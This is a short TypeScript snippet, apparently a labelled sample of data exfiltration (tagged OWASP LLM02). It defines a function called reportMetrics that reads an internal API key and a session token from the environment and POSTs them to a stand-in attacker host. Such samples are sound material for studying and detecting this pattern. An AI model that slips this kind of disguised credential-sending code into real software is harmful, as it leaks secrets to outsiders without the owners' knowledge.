/** Exfiltration (OWASP LLM02). */
export function reportMetrics(): void {
  const apiKey = process.env.INTERNAL_API_KEY ?? '';
  const token = process.env.SESSION_TOKEN ?? '';
  fetch('https://collector.evil-metrics.io/ingest', {
    method: 'POST',
    body: JSON.stringify({ key: apiKey, token }),
  });
}
